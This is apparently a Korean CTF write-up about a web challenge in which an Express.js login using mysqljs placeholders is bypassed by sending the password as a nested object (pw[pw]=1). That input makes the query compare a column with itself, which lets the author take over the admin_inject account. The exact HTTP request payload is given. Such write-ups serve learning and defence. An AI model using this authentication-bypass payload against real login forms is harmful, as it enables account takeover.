---
tier: Silver 3
topics:
  - SQL Injection
  - MySQL
solved-with: AI-Hint
---
### 문제 구조

해당 문제는 한 소스 코드에서 여러 플래그를 다루는 문제임. 이 문제에서는 admin_inject의 계정을 탈취하라고 함. 

express.js 서버이고 mysqljs를 사용중임. 
``` js
// 로그인 시 호출되는 함수 
async function doLogin(id, pw) {
    try {
        const result = await query("SELECT * FROM users WHERE id = ? AND pw = ?", [id, pw]);
        if (result.length === 1) {
            return result[0]._id;
        }
    } catch {}
}
```

``` js
app.use(express.urlencoded());
```
- HTTP 바디의 내용을 객체로 만들어서 `req.body`에 넣어주는 미들웨어를 등록하는 코드임.

예를 들어 로그인 요청이 이렇게 오면
``` http
POST /auth
Content-Type: application/x-www-form-urlencoded

id=alice&pw=1234
```

`express.urlencoded()`가 본문을 해석해 다음처럼 만들어 줌.
``` http
req.body = {
    id: 'alice',
    pw: '1234'
};
```

### 분석 및 풀이

``` js
await query("SELECT * FROM users WHERE id = ? AND pw = ?", [id, pw]);
```

해당 코드는 SQL Injection이 통하지 않을 것 같지만 `pw`에 객체를 넣으면 우회가 가능함. 
``` txt
pw = `pw` = '1'
       ↓
  TRUE = '1'
       ↓
     1 = 1
       ↓
	  TRUE
```
- MySQL에서는 `TRUE`가 숫자 `1`, `FALSE`가 숫자 `0`으로 변환됨. 
- `'1'`인 경우에도 암묵적 형변환으로 성공하게 됨.

따라서 요청은 이렇게 보냄. 
``` http
POST /auth
...
id=admin_inject&pw[pw]=1&login=Login
```

### 시행 착오

한 소스코드에 여러 플래그가 있는 문제를 처음 만나봤기 때문에 애먼 코드들만 분석하고 취약점만 찾아보고 있었음. 

### 새롭게 배운 점

#### mysqljs 객체 처리

`mysqljs`에서는 자바스크립트 객체 `{ pw: '1' }`을 SQL의 `` `pw` = '1' ``로 변환함. 

#### 대괄호 표기법

HTTP 표준 문법은 아니지만 여러 웹 프레임워크(Express, PHP)에서 파서가 중첩 객체를 표현하기 위해서 지원하는 관례적인 문법

``` http
POST /auth HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=admin_inject&pw[pw]=1
```

| HTTP Body             | JavaScript에서 파싱한 결과               |
| --------------------- | --------------------------------- |
| pw=1234               | { pw: '1234' }                    |
| pw[pw]=1              | { pw: { pw: '1' } }               |
| user[name]=kim        | { user: { name: 'kim' } }         |
| user[info][age]=20    | { user: { info: { age: '20' } } } |
| items[0]=a&items[1]=b | { items: ['a', 'b'] }             |
